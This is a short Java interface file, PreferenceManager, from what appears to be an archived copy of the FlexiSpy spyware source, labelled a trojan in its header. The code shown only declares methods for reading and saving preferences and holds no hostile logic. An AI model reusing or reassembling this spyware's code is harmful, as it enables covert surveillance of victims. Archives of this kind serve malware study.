/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.preference_manager;


/**
 * @author aruna
 * @version 1.0
 * @created 28-Nov-2011 10:51:48
 */
public interface PreferenceManager {

	/**
	 * 
	 * @param type
	 */
	public Preference getPreference(PreferenceType type);

	/**
	 * 
	 * @param preference
	 */
	public void savePreferenceAndNotifyChange(Preference preference);

}